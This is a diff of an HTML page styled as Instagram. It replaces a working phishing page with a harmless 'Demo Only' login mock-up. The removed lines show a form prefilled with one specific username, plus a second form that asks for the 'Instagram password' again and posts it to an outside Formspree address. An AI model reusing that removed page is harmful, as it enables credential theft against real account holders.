@@ -1,137 +1,146 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://code.jquery.com;">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-    <style>
-        body {
-            font-family: 'Arial', sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #fafafa;
-        }
+<title>Instagram Demo</title>
 
-        .container {
-            max-width: 600px;
-            margin: 50px auto;
-            background-color: #fff;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-        }
+<style>
+body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    background-color: #fafafa;
+    margin: 0;
+    padding: 0;
+}
 
-        form {
-            display: flex;
-            flex-direction: column;
-        }
+.logo {
+    text-align: center;
+    margin-top: 40px;
+}
 
-        logo{
-         align-items: center;
-         text-align: center;
-        }
-        label {
-            margin-bottom: 8px;
-        }
+.logo img {
+    width: 180px;
+}
 
-        input, textarea {
-            padding: 10px;
-            margin-bottom: 16px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-        }
+.container {
+    width: 350px;
+    margin: 20px auto;
+    background-color: #fff;
+    border: 1px solid #dbdbdb;
+    padding: 40px;
+    text-align: center;
+}
 
-        button {
-            background-color: #3897f0;
-            color: #fff;
-            padding: 10px;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-        }
+h1 {
+    font-family: cursive;
+    font-size: 32px;
+    margin-bottom: 20px;
+}
 
-        button:hover {
-            background-color: #2671a8;
-        }
+form {
+    display: flex;
+    flex-direction: column;
+}
 
-        #loginMessage, #formMessage {
-            margin-top: 16px;
-            font-weight: bold;
-        }
+input {
+    background: #fafafa;
+    border: 1px solid #dbdbdb;
+    padding: 10px;
+    margin-bottom: 10px;
+    border-radius: 3px;
+    font-size: 14px;
+}
 
-        #loginMessage.success, #formMessage.success {
-            color: #00cc00;
-        }
+input:focus {
+    outline: none;
+    border: 1px solid #a8a8a8;
+}
 
-        #loginMessage.error, #formMessage.error {
-            color: #ff0000;
-        }
+button {
+    background-color: #3897f0;
+    color: white;
+    border: none;
+    padding: 10px;
+    font-weight: bold;
+    border-radius: 6px;
+    cursor: pointer;
+    margin-top: 10px;
+}
 
-        @media (max-width: 600px) {
-            .container {
-                margin: 20px;
-            }
-        }
-    </style>
-    <title>Instagram Lite</title>
+button:hover {
+    background-color: #1877f2;
+}
+
+#loginMessage {
+    font-size: 14px;
+    margin-top: 10px;
+}
+
+.success {
+    color: #2ecc71;
+}
+
+.error {
+    color: #e74c3c;
+}
+
+.forgot {
+    margin-top: 15px;
+    font-size: 14px;
+    color: #00376b;
+    cursor: pointer;
+}
+
+@media (max-width: 600px) {
+    .container {
+        width: 90%;
+        padding: 20px;
+    }
+}
+</style>
 </head>
-<body> <div class="logo">
-    <img src="insta.png"  alt=""></div>
-    <div class="container">
-        <form id="loginForm" onsubmit="return login()">
-            <h1>Instagram Lite</h1>
-            <label for="username">Username:</label>
-            <input type="text" id="username" name="username" value="__neha.__.227" required>
-            
-            <label for="password">Password:</label>
-            <input type="text" id="password" name="password" required>
 
-            <button type="submit">Submit</button>
-            <p id="loginMessage"></p>
-        </form>
+<body>
 
-        <!-- Your new form -->
-        <form id="contactForm" action="https://formspree.io/f/mvojnako" method="POST">
-            <label for="email">Your email:</label>
-            <input type="email" id="email" name="email" required>
-            
-            <label for="message">Your message:</label>
-            <textarea id="message" name="message" required></textarea>
+<div class="logo">
+    <!-- You can replace this with your local image -->
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
+</div>
 
-            <label for="text">Confirm Your Instagram Password:</label>
-            <textarea id="text" name="text" required></textarea>
+<div class="container">
+    <form onsubmit="return login()">
+        <h1>Instagram</h1>
 
-            <button type="submit">Verify</button>
-            <p id="formMessage"></p>
-        </form>
-    </div>
+        <input type="text" id="username" placeholder="Phone number, username, or email" required>
 
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-    <script>
-        function login() {
-            var username = document.getElementById('username').value;
-            var password = document.getElementById('password').value;
-            var loginMessage = document.getElementById('loginMessage');
+        <input type="password" id="password" placeholder="Password" required>
 
-            // Perform authentication logic here (checking against a database, etc.)
-            if (username === "__neha.__.227" && password !== "") {
-                sendVerificationEmail(username);
-                loginMessage.className = 'success';
-                loginMessage.innerHTML = 'Verification email sent. Check your email inbox after some time.';
-                return false; // Prevent form submission for this example
-            } else {
-                loginMessage.className = 'error';
-                loginMessage.innerHTML = 'Incorrect username or password. Please try again.';
-                return false; // Prevent form submission for this example
-            }
-        }
+        <button type="submit">Log In</button>
 
-        function sendVerificationEmail(username) {
-            // This function should be implemented on the server-side
-            // to send an email using Node.js and Nodemailer, for example.
-            console.log('Sending verification email to ' + username);
-        }
-    </script>
+        <p id="loginMessage"></p>
+
+        <div class="forgot">Forgot password?</div>
+    </form>
+</div>
+
+<script>
+function login() {
+    var username = document.getElementById('username').value;
+    var password = document.getElementById('password').value;
+    var message = document.getElementById('loginMessage');
+
+    if (username !== "" && password !== "") {
+        message.className = "success";
+        message.innerHTML = "Login Successful (Demo Only)";
+    } else {
+        message.className = "error";
+        message.innerHTML = "Please fill all fields correctly.";
+    }
+
+    return false;
+}
+</script>
+
 </body>
 </html>
